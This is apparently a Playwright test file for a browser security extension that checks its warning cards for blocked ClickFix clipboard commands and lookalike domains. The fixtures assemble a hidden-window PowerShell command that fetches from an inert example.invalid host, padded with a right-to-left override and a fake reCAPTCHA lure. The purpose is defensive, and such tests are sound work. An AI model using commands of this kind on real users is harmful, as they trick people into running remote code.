// Bastion Shield e2e — in-page notices, «UI Optimised» phase 1 (Paper
// N01–N09): the ClickFix card with its command disclosure, invisible
// characters, character count and stack, and the lookalike card with the
// boxed differences, long hosts, both buttons, dark mode and a 360px viewport.
//
// The notices live in a closed shadow root. Roles and names are read through
// the accessibility tree (as assistive technology does, see
// 11-nerd-guards.spec.ts); layout and attributes through CDP, which can
// resolve nodes inside closed shadow roots. Clicks are real mouse input.
// Payloads are inert (example.invalid) and assembled from pieces (x(...)) so
// the file holds no command line verbatim (antivirus engines flag those).
//
// BASTION_SHOTS=<dir> saves light/dark screenshots of N01, N02, N05 and N06.
//
// SPDX-FileCopyrightText: 2026 Bastion Security GmbH and contributors
// SPDX-License-Identifier: GPL-3.0-or-later

import { mkdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import type { Page } from '@playwright/test';
import { expect, test } from '../support/fixtures.ts';
import { HOSTS } from '../support/hosts.ts';
import { REPO_ROOT } from '../support/paths.ts';

const x = (...parts: string[]) => parts.join('');
const PS = (tail: string) => x('power', 'shell -w hid', 'den -c "Write-Output (irm https://example.invalid/', tail, ')"');
/** A long command with a right-to-left override hidden inside (N02/N03). */
const LONG = x(PS('stage2'), '; # Rechnung', '‮', 'fdp.exe ', 'I am not a robot - reCAPTCHA Verification ID 7731-2208 '.repeat(12));

const CLIP_TITLE = /^(Dangerous command stopped|Gefährlicher Befehl gestoppt|Commande dangereuse bloquée|Comando pericoloso bloccato)$/;
const SHOW = /^(Show command|Befehl ansehen|Voir la commande|Mostra il comando)$/;
const HIDE = /^(Hide command|Befehl ausblenden|Masquer la commande|Nascondi il comando)$/;
const CLOSE = /^(Close|Schliessen|Fermer|Chiudi)$/;
const MORE = /^(\d+) (more notices?|weitere Meldung(en)?|autres? alertes?|altr[oi] avvis[oi])$/;
const MORE_SHOW = /^(Show|Anzeigen|Afficher|Mostra)$/;
const MORE_HIDE = /^(Hide|Ausblenden|Masquer|Nascondi)$/;
const LOOK_TITLE = /^(This isn’t|Das ist nicht|Ce n’est pas|Questo non è) /;
const LEAVE = /^(Leave site|Seite verlassen|Quitter le site|Lascia il sito)$/;
const STAY = /^(Stay anyway|Trotzdem bleiben|Rester quand même|Resta comunque)$/;
const FULL = /^(Full address|Ganze Adresse|Adresse complète|Indirizzo completo)$/;
const CHARS = /\d+ (characters|Zeichen|caractères|caratteri)/;
const INVISIBLE = /^(Invisible character|Unsichtbares Zeichen|Caractère invisible|Carattere invisibile) U\+202E$/;
const RAW_KEY = /\bnotice[A-Z][A-Za-z]+\b/;

interface AxNode {
  role: string;
  name: string;
  backendId?: number;
}

async function axTree(page: Page): Promise<AxNode[]> {
  const cdp = await page.context().newCDPSession(page);
  try {
    const r = (await cdp.send('Accessibility.getFullAXTree')) as {
      nodes: { ignored?: boolean; role?: { value?: string }; name?: { value?: string }; backendDOMNodeId?: number }[];
    };
    return r.nodes.filter((n) => !n.ignored).map((n) => ({ role: String(n.role?.value ?? ''), name: String(n.name?.value ?? ''), backendId: n.backendDOMNodeId }));
  } finally {
    await cdp.detach();
  }
}

/** Titles of the notice cards shown (role alert; collapsed ones are hidden). */
async function alerts(page: Page): Promise<string[]> {
  return (await axTree(page)).filter((n) => n.role === 'alert').map((n) => n.name);
}

async function clickAx(page: Page, role: string, name: RegExp, nth = 0): Promise<void> {
  const node = (await axTree(page)).filter((n) => n.role === role && name.test(n.name))[nth];
  if (!node?.backendId) throw new Error(`no ${role} ${name}`);
  const cdp = await page.context().newCDPSession(page);
  try {
    await cdp.send('DOM.getDocument', { depth: -1, pierce: true });
    const { model } = (await cdp.send('DOM.getBoxModel', { backendNodeId: node.backendId })) as { model: { content: number[] } };
    const q = model.content;
    await page.mouse.click((q[0]! + q[4]!) / 2, (q[1]! + q[5]!) / 2);
  } finally {
    await cdp.detach();
  }
}

interface DomNode {
  backendNodeId: number;
  nodeName: string;
  shadowRoots?: DomNode[];
  children?: DomNode[];
  shadowRootType?: string;
}

/**
 * Runs `fn` (a function source; `this` is the notices' closed shadow root)
 * in the page and returns its JSON result. Null when no notice host exists.
 */
async function inNotices<T>(page: Page, fn: string, arg?: unknown): Promise<T | null> {
  const cdp = await page.context().newCDPSession(page);
  try {
    const { root } = (await cdp.send('DOM.getDocument', { depth: -1, pierce: true })) as { root: DomNode };
    let found: DomNode | null = null;
    const walk = (n: DomNode): void => {
      for (const s of n.shadowRoots ?? []) if (s.shadowRootType === 'closed' && found === null) found = s;
      for (const c of n.children ?? []) walk(c);
    };
    walk(root);
    if (found === null) return null;
    const { object } = (await cdp.send('DOM.resolveNode', { backendNodeId: (found as DomNode).backendNodeId })) as { object: { objectId: string } };
    const r = (await cdp.send('Runtime.callFunctionOn', {
      functionDeclaration: fn,
      objectId: object.objectId,
      arguments: [{ value: arg ?? null }],
      returnByValue: true,
      awaitPromise: true,
    })) as { result: { value: T }; exceptionDetails?: { text: string } };
    if (r.exceptionDetails) throw new Error(r.exceptionDetails.text);
    return r.result.value;
  } finally {
    await cdp.detach();
  }
}

/** Facts about the first visible ClickFix card. */
interface ClipFacts {
  expanded: string | null;
  controls: boolean;
  boxHidden: boolean;
  discHeight: number;
  closeSize: [number, number];
  tileHidden: string | null;
  tileSize: [number, number];
  brandNoTranslate: boolean;
  cmdNoTranslate: boolean;
  cmdText: string;
  chips: string[];
  meta: string;
  countVisible: boolean;
  scrolls: boolean;
  fade: boolean;
  cmdStyle: { overflowWrap: string; overscroll: string; maxHeight: string; clientHeight: number };
  cardWidth: number;
  cardRadius: string;
  cardPadding: string;
  titleSize: string;
  bodySize: string;
  background: string;
}

const CLIP_FACTS = `function () {
  const c = [...this.querySelectorAll('.card.clip')].find((e) => e.closest('[hidden]') === null);
  if (!c) return null;
  const disc = c.querySelector('.disc');
  const box = c.querySelector('.cmdbox');
  const cmd = c.querySelector('.cmd');
  const field = c.querySelector('.field');
  const count = c.querySelector('.meta .count');
  const tile = c.querySelector('.tile');
  const close = c.querySelector('.close');
  const cs = getComputedStyle(cmd);
  const b = (e) => e.getBoundingClientRect();
  const r = (e) => { const q = b(e); return { width: Math.round(q.width * 10) / 10, height: Math.round(q.height * 10) / 10 }; };
  return {
    expanded: disc.getAttribute('aria-expanded'),
    controls: disc.getAttribute('aria-controls') === box.id,
    boxHidden: box.hidden,
    discHeight: r(disc).height,
    closeSize: [r(close).width, r(close).height],
    tileHidden: tile.getAttribute('aria-hidden'),
    tileSize: [r(tile).width, r(tile).height],
    brandNoTranslate: c.querySelector('.brand').getAttribute('translate') === 'no',
    cmdNoTranslate: box.getAttribute('translate') === 'no',
    cmdText: cmd.textContent,
    chips: [...cmd.querySelectorAll('.inv')].map((e) => e.getAttribute('aria-label')),
    meta: c.querySelector('.meta').innerText,
    countVisible: count ? !count.hidden && count.offsetParent !== null : null,
    scrolls: field.classList.contains('scrolls'),
    fade: field.classList.contains('scrolls') && !field.classList.contains('at-end') && getComputedStyle(c.querySelector('.fade')).transitionProperty === 'opacity',
    cmdStyle: { overflowWrap: cs.overflowWrap, overscroll: cs.overscrollBehaviorY, maxHeight: cs.maxHeight, clientHeight: cmd.clientHeight },
    cardWidth: r(c).width,
    cardRadius: getComputedStyle(c).borderTopLeftRadius,
    cardPadding: getComputedStyle(c).paddingTop,
    titleSize: getComputedStyle(c.querySelector('.title')).fontSize,
    bodySize: getComputedStyle(c.querySelector('.body')).fontSize,
    background: getComputedStyle(c).backgroundColor,
  };
}`;

/** All text of the notices plus aria-labels and titles (for raw-key checks). */
const ALL_TEXT = `function () {
  const attrs = [...this.querySelectorAll('[aria-label],[title]')].map((e) => (e.getAttribute('aria-label') || '') + ' ' + (e.getAttribute('title') || ''));
  return [this.querySelector('.stack')?.textContent || '', ...attrs].join('\\n');
}`;

const DEMO = readFileSync(path.join(REPO_ROOT, 'test', 'fixtures', 'clickfix-demo.html'), 'utf8');

async function openDemo(page: Page, server: { setPage(h: string, p: string, b: string): string }, ext: { context: { grantPermissions(p: string[], o: { origin: string }): Promise<void> } }): Promise<void> {
  const url = server.setPage(HOSTS.A, '/e2e/clickfix-demo.html', DEMO);
  await ext.context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: new URL(url).origin });
  await page.goto(url);
  await page.bringToFront();
}

/** The page writes `text` to the clipboard (a blocked ClickFix write). */
const write = (page: Page, text: string) => page.evaluate((s) => navigator.clipboard.writeText(s).catch(() => undefined), text);

async function shoot(page: Page, name: string): Promise<void> {
  const dir = process.env.BASTION_SHOTS;
  if (!dir) return;
  mkdirSync(dir, { recursive: true });
  await page.waitForTimeout(300); // the card's enter animation
  const box = await inNotices<{ x: number; y: number; w: number; h: number }>(
    page,
    `function () { const r = this.querySelector('.stack').getBoundingClientRect(); return { x: r.left, y: r.top, w: r.width, h: r.height }; }`,
  );
  if (box === null) return;
  const vp = page.viewportSize()!;
  const pad = 24;
  const clip = { x: Math.max(0, box.x - pad), y: 0, width: Math.min(vp.width, box.x + box.w + pad) - Math.max(0, box.x - pad), height: Math.min(vp.height, box.y + box.h + pad + 12) };
  await page.screenshot({ path: path.join(dir, `${name}.png`), clip, animations: 'disabled' });
}

test.describe('in-page notices (phase 1)', () => {
  test.beforeAll(async ({ ext }) => {
    await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: true } } }, 6000);
  });
  test.afterAll(async ({ ext }) => {
    await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: false } } }, 6000);
  });
  test.afterEach(async ({ page }) => {
    await page.emulateMedia({ colorScheme: 'light' });
  });

  test('ClickFix: collapsed card, disclosure, long command with invisible characters, Esc', async ({ page, server, ext }) => {
    await openDemo(page, server, ext);
    await write(page, LONG);
    await expect.poll(() => alerts(page)).toHaveLength(1);
    expect((await alerts(page))[0]).toMatch(CLIP_TITLE);

    // N01: collapsed, card geometry from the artboard.
    let f = (await inNotices<ClipFacts>(page, CLIP_FACTS))!;
    expect(f.expanded).toBe('false');
    expect(f.controls, 'aria-controls names the command box').toBe(true);
    expect(f.boxHidden).toBe(true);
    expect(f.cardWidth).toBe(340);
    expect(f.cardRadius).toBe('24px');
    expect(f.cardPadding).toBe('12px');
    expect(f.titleSize).toBe('17px');
    expect(f.bodySize).toBe('14px');
    expect(f.tileHidden).toBe('true');
    expect(f.tileSize).toEqual([48, 48]);
    expect(f.closeSize).toEqual([32, 32]);
    expect(f.discHeight).toBe(32);
    expect(f.brandNoTranslate && f.cmdNoTranslate, 'translate=no on brand and command').toBe(true);
    expect(f.background).toBe('rgb(255, 255, 255)');
    const ax = await axTree(page);
    expect(ax.some((n) => n.role === 'button' && SHOW.test(n.name))).toBe(true);
    expect(ax.some((n) => n.role === 'button' && CLOSE.test(n.name))).toBe(true);
    await shoot(page, 'N01-light');

    // N02/N03: expanded, max 6 lines, scrolls, count and hidden character shown.
    await clickAx(page, 'button', SHOW);
    f = (await inNotices<ClipFacts>(page, CLIP_FACTS))!;
    expect(f.expanded).toBe('true');
    expect(f.boxHidden).toBe(false);
    expect((await axTree(page)).some((n) => n.role === 'button' && HIDE.test(n.name)), 'label changes to «Befehl ausblenden»').toBe(true);
    expect(f.cmdText).toContain('U+202E');
    expect(f.cmdText).not.toContain('‮');
    expect(f.chips).toHaveLength(1);
    expect(f.chips[0]).toMatch(INVISIBLE);
    expect(f.cmdStyle.overflowWrap).toBe('anywhere');
    expect(f.cmdStyle.overscroll).toBe('contain');
    expect(f.cmdStyle.clientHeight).toBeLessThanOrEqual(126);
    expect(f.scrolls, 'the long command scrolls').toBe(true);
    expect(f.fade, 'fade while more text is below').toBe(true);
    expect(f.meta).toMatch(CHARS);
    expect(f.meta).toMatch(/^(1 hidden character|1 verstecktes Zeichen|1 caractère caché|1 carattere nascosto) - /);
    expect(f.cardWidth).toBe(340);
    await shoot(page, 'N02-light');

    // Scrolled to the end, the fade goes.
    await inNotices(page, `function () { const c = this.querySelector('.cmd'); c.scrollTop = c.scrollHeight; c.dispatchEvent(new Event('scroll')); }`);
    expect((await inNotices<ClipFacts>(page, CLIP_FACTS))!.fade).toBe(false);

    // Dark (N04).
    await page.emulateMedia({ colorScheme: 'dark' });
    f = (await inNotices<ClipFacts>(page, CLIP_FACTS))!;
    expect(f.background).toBe('rgb(23, 28, 30)');
    await inNotices(page, `function () { const c = this.querySelector('.cmd'); c.scrollTop = 0; c.dispatchEvent(new Event('scroll')); }`);
    await shoot(page, 'N02-dark');
    await clickAx(page, 'button', HIDE);
    f = (await inNotices<ClipFacts>(page, CLIP_FACTS))!;
    expect(f.expanded).toBe('false');
    expect(f.boxHidden).toBe(true);
    await shoot(page, 'N01-dark');
    await page.emulateMedia({ colorScheme: 'light' });

    // Keyboard: the disclosure has a visible 2px focus ring; Esc closes the card.
    await inNotices(page, `function () { this.querySelector('.disc').focus(); }`);
    await page.keyboard.press('Shift+Tab');
    await page.keyboard.press('Tab');
    const focus = await inNotices<{ cls: string; width: string; style: string; offset: string } | null>(
      page,
      `function () { const a = this.activeElement; if (!a) return null; const s = getComputedStyle(a); return { cls: a.className, width: s.outlineWidth, style: s.outlineStyle, offset: s.outlineOffset }; }`,
    );
    expect(focus, 'focus enters the notice').not.toBeNull();
    expect(focus!.width).toBe('2px');
    expect(focus!.style).toBe('solid');
    expect(focus!.offset).toBe('2px');
    expect(await inNotices<string>(page, ALL_TEXT)).not.toMatch(RAW_KEY);
    await page.keyboard.press('Escape');
    await expect.poll(() => alerts(page)).toHaveLength(0);
  });

  test('ClickFix: a short command shows no character count and no fade; close button removes the card', async ({ page, server, ext }) => {
    await openDemo(page, server, ext);
    await write(page, PS('short'));
    await expect.poll(() => alerts(page)).toHaveLength(1);
    await clickAx(page, 'button', SHOW);
    const f = (await inNotices<ClipFacts>(page, CLIP_FACTS))!;
    expect(f.scrolls).toBe(false);
    expect(f.countVisible, 'count only while the field scrolls').toBe(false);
    expect(f.fade).toBe(false);
    expect(f.meta).not.toMatch(CHARS);
    expect(f.chips).toHaveLength(0);
    await clickAx(page, 'button', CLOSE);
    await expect.poll(() => alerts(page)).toHaveLength(0);
  });

  test('stack: newest on top, older ones collapse into «N weitere Meldungen» and expand', async ({ page, server, ext }) => {
    // N05: a lookalike warning, then two blocked commands on the same page.
    server.setPage('*', '/e2e/stack21.html', '<!doctype html><meta charset="utf-8"><title>stack</title><p>Press the button to verify you are human.</p>');
    const href = 'https://www.paypa1.com/e2e/stack21.html';
    await ext.context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: new URL(href).origin });
    await page.goto(href);
    await page.bringToFront();
    await expect.poll(() => alerts(page)).toHaveLength(1);
    for (const tail of ['one', 'two']) {
      await write(page, PS(tail));
      await page.waitForTimeout(50);
    }
    await expect.poll(async () => (await axTree(page)).find((n) => MORE.test(n.name))?.name ?? '').toMatch(/^2 /);
    expect(await alerts(page)).toHaveLength(1);
    expect((await alerts(page))[0]).toMatch(CLIP_TITLE);
    const row = await inNotices<{ sum: string; minis: number; tiles: string | null }>(
      page,
      `function () { const m = this.querySelector('.more'); return { sum: m.querySelector('.more-sum').textContent, minis: m.querySelectorAll('.mini').length, tiles: m.querySelector('.minis').getAttribute('aria-hidden') }; }`,
    );
    expect(row).toEqual({ sum: expect.stringMatching(/^1 \S+ - 1 \S+$/), minis: 2, tiles: 'true' });
    const order = await inNotices<string[]>(page, `function () { return [...this.querySelectorAll('.card.clip .cmd')].map((e) => e.textContent); }`);
    expect(order![0], 'newest on top').toContain('two');
    await shoot(page, 'N05-light');
    await page.emulateMedia({ colorScheme: 'dark' });
    await shoot(page, 'N05-dark');
    await page.emulateMedia({ colorScheme: 'light' });

    await clickAx(page, 'button', MORE_SHOW);
    await expect.poll(() => alerts(page)).toHaveLength(3);
    const exp = await inNotices<string | null>(page, `function () { return this.querySelector('.more .btn').getAttribute('aria-expanded'); }`);
    expect(exp).toBe('true');
    await clickAx(page, 'button', MORE_HIDE);
    await expect.poll(() => alerts(page)).toHaveLength(1);

    // Closing the top card brings the next one up; the row counts down.
    await clickAx(page, 'button', CLOSE);
    await expect.poll(async () => (await axTree(page)).find((n) => MORE.test(n.name))?.name ?? '').toMatch(/^1 /);
    expect(await alerts(page)).toHaveLength(1);
    await clickAx(page, 'button', CLOSE);
    await expect.poll(async () => (await axTree(page)).some((n) => MORE.test(n.name))).toBe(false);
    expect(await alerts(page)).toHaveLength(1);
    expect(await inNotices<string>(page, ALL_TEXT)).not.toMatch(RAW_KEY);
  });

  test('stack: past 30 ClickFix cards further blocks only raise the row count', async ({ page, server, ext }) => {
    await openDemo(page, server, ext);
    for (let i = 1; i <= 32; i++) await write(page, PS(`cap${i}`));
    const moreName = async () => (await axTree(page)).find((n) => MORE.test(n.name))?.name ?? '';
    // 32 blocks: newest card + 29 older cards + 2 counted = «31 weitere Meldungen», «31 Befehle».
    await expect.poll(moreName, { timeout: 15_000 }).toMatch(/^31 /);
    expect(await inNotices<string>(page, `function () { return this.querySelector('.more-sum').textContent; }`)).toMatch(/^31 /);
    expect(await alerts(page)).toHaveLength(1);
    expect(await inNotices<number>(page, `function () { return this.querySelectorAll('.card.clip').length; }`), 'no more than the cap of cards').toBe(30);
    await clickAx(page, 'button', MORE_SHOW);
    await expect.poll(() => alerts(page)).toHaveLength(30);
    // One more block while expanded: still 30 cards, the count goes up.
    await write(page, PS('cap33'));
    await expect.poll(moreName).toMatch(/^32 /);
    expect(await alerts(page)).toHaveLength(30);
    expect(await inNotices<string>(page, ALL_TEXT)).not.toMatch(RAW_KEY);
  });

  test('lookalike: real and visited address with boxed differences; «Trotzdem bleiben» closes', async ({ page, server }) => {
    server.setPage('*', '/e2e/look21.html', '<!doctype html><meta charset="utf-8"><title>look</title><p>hello</p>');
    await page.goto('https://www.paypa1.com/e2e/look21.html');
    await expect.poll(() => alerts(page)).toHaveLength(1);
    expect((await alerts(page))[0]).toMatch(LOOK_TITLE);
    expect((await alerts(page))[0]).toMatch(/paypal\.com$/);
    const facts = await inNotices<{ real: string; here: string; marks: string[]; noTranslate: boolean; width: number; tile: string | null }>(
      page,
      `function () {
        const c = this.querySelector('.card.look');
        const dds = c.querySelectorAll('dd');
        return {
          real: dds[0].textContent, here: dds[1].textContent,
          marks: [...dds[1].querySelectorAll('mark')].map((m) => m.textContent),
          noTranslate: [...dds].every((d) => d.getAttribute('translate') === 'no') && c.querySelector('.title span').getAttribute('translate') === 'no',
          width: c.getBoundingClientRect().width,
          tile: c.querySelector('.tile').getAttribute('aria-hidden'),
        };
      }`,
    );
    expect(facts).toEqual({ real: 'paypal.com', here: 'www.paypa1.com', marks: ['1'], noTranslate: true, width: 340, tile: 'true' });
    const ax = await axTree(page);
    expect(ax.some((n) => n.role === 'button' && LEAVE.test(n.name))).toBe(true);
    expect(ax.some((n) => n.role === 'button' && FULL.test(n.name)), 'short host: no «Ganze Adresse»').toBe(false);
    await shoot(page, 'N06-light');
    await page.emulateMedia({ colorScheme: 'dark' });
    expect(await inNotices<string>(page, `function () { return getComputedStyle(this.querySelector('.card')).backgroundColor; }`)).toBe('rgb(23, 28, 30)');
    await shoot(page, 'N06-dark');
    await page.emulateMedia({ colorScheme: 'light' });
    expect(await inNotices<string>(page, ALL_TEXT)).not.toMatch(RAW_KEY);
    await clickAx(page, 'button', STAY);
    await expect.poll(() => alerts(page)).toHaveLength(0);
    expect(page.url()).toBe('https://www.paypa1.com/e2e/look21.html');
  });

  test('lookalike: «Seite verlassen» goes back', async ({ page, server }) => {
    const start = server.setPage(HOSTS.A, '/e2e/look21-start.html', '<!doctype html><meta charset="utf-8"><title>start</title>');
    server.setPage('*', '/e2e/look21b.html', '<!doctype html><meta charset="utf-8"><title>look</title><p>hello</p>');
    await page.goto(start);
    await page.goto('https://rnicrosoft.com/e2e/look21b.html');
    await expect.poll(() => alerts(page)).toHaveLength(1);
    await clickAx(page, 'button', LEAVE);
    await page.waitForURL(start);
  });

  for (const vp of [
    { name: 'desktop', width: 1280, card: 340 },
    { name: '360px', width: 360, card: 336 },
  ]) {
    test(`lookalike: a very long host stays inside the card (${vp.name}), «Ganze Adresse» shows it all`, async ({ page, server }) => {
      const host = 'postfinance.ch.secure-login-kundencenter-verify-account.top';
      server.setPage('*', '/e2e/look21c.html', '<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>look</title><p>hello</p>');
      await page.setViewportSize({ width: vp.width, height: 760 });
      await page.goto(`https://${host}/e2e/look21c.html`);
      await expect.poll(() => alerts(page)).toHaveLength(1);
      const lay = `function () {
        const c = this.querySelector('.card.look');
        const dd = c.querySelectorAll('dd')[1];
        const r = c.getBoundingClientRect();
        const over = [...c.querySelectorAll('*')].filter((e) => e.getBoundingClientRect().right > r.right + 0.5 && e.closest('[hidden]') === null && !e.classList.contains('sr')).map((e) => e.className || e.tagName);
        return { width: r.width, right: innerWidth - r.right, cardScroll: c.scrollWidth - c.clientWidth, ddOverflow: dd.scrollWidth - dd.clientWidth, shown: dd.textContent, title: dd.title, over, docScroll: document.documentElement.scrollWidth - innerWidth };
      }`;
      const l = (await inNotices<{ width: number; right: number; cardScroll: number; ddOverflow: number; shown: string; title: string; over: string[]; docScroll: number }>(page, lay))!;
      expect(l.width).toBe(vp.card);
      expect(l.right).toBe(12);
      expect(l.cardScroll, 'no horizontal overflow in the card').toBeLessThanOrEqual(0);
      expect(l.ddOverflow, 'host fits its row').toBeLessThanOrEqual(0);
      expect(l.over, 'nothing sticks out of the card').toEqual([]);
      expect(l.docScroll, 'no horizontal page scroll').toBeLessThanOrEqual(0);
      expect(l.shown).toContain('…');
      expect(l.shown.startsWith('postfinance')).toBe(true);
      expect(l.shown.endsWith('.top')).toBe(true);
      expect(l.title, 'full host in the title').toBe(host);

      await clickAx(page, 'button', FULL);
      const full = await inNotices<{ expanded: string | null; text: string; visible: boolean; over: number }>(
        page,
        `function () { const b = this.querySelector('.full .disc'); const p = this.querySelector('.fullhost'); return { expanded: b.getAttribute('aria-expanded'), text: p.textContent, visible: !p.hidden, over: p.scrollWidth - p.clientWidth }; }`,
      );
      expect(full).toEqual({ expanded: 'true', text: host, visible: true, over: 0 });
      const after = (await inNotices<{ over: string[] }>(page, lay))!;
      expect(after.over).toEqual([]);
      if (vp.width === 360) {
        // Below 364px the brand name goes (artboard N09); it stays for screen readers.
        await page.emulateMedia({ colorScheme: 'dark' });
        expect(await inNotices<string>(page, `function () { return getComputedStyle(this.querySelector('.card')).backgroundColor; }`)).toBe('rgb(23, 28, 30)');
      }
      expect(await inNotices<string>(page, ALL_TEXT)).not.toMatch(RAW_KEY);
      await page.keyboard.press('Tab');
      await page.keyboard.press('Escape');
      await expect.poll(() => alerts(page)).toHaveLength(0);
    });
  }

  test('ClickFix at 360px: card fits, brand name hidden visually, command wraps', async ({ page, server, ext }) => {
    await page.setViewportSize({ width: 360, height: 740 });
    await openDemo(page, server, ext);
    await write(page, LONG);
    await expect.poll(() => alerts(page)).toHaveLength(1);
    await clickAx(page, 'button', SHOW);
    const f = (await inNotices<ClipFacts>(page, CLIP_FACTS))!;
    expect(f.cardWidth).toBe(336);
    const brand = await inNotices<{ nameWidth: number; text: string; cmdOver: number }>(
      page,
      `function () { const n = this.querySelector('.brand-name'); const c = this.querySelector('.cmd'); return { nameWidth: n.getBoundingClientRect().width, text: n.textContent, cmdOver: c.scrollWidth - c.clientWidth }; }`,
    );
    expect(brand!.nameWidth).toBeLessThanOrEqual(1);
    expect(brand!.text).toBe('Bastion Shield');
    expect(brand!.cmdOver, 'command wraps, never scrolls sideways').toBeLessThanOrEqual(0);
  });
});
